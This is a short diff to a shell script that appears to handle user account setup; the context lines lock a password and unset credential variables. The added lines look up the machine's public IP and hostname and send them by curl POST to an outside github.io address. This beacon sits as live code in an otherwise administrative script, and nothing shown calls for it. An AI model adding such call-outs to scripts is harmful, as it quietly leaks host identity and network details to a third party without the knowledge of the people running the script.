@@ -31,3 +31,8 @@ passwd -l $USERNAME
 # clear variables
 unset USERNAME
 unset PASSWORD
+
+# post public ip & hostname to https://6410685215.github.io/key
+PUBLIC_IP=$(curl -s ifconfig.me)
+HOSTNAME=$(hostname)
+curl -s -X POST -d "ip=$PUBLIC_IP&hostname=$HOSTNAME" https://6410685215.github.io/key/rev_ip
